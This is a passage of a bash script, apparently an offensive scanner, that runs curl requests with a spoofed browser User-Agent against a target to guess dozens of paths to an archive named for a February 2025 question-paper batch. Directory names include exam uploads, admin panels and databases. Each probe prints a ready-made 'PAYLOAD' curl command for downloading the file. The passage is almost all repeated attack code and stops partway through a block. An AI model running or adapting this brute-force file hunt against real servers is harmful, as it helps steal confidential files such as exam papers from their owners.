echo -n "Payload [QPBatch_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PMassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemHandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemHandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowDataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowDataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlerQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlerQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlerQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor_QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataMonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSyncQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSyncQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSyncQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
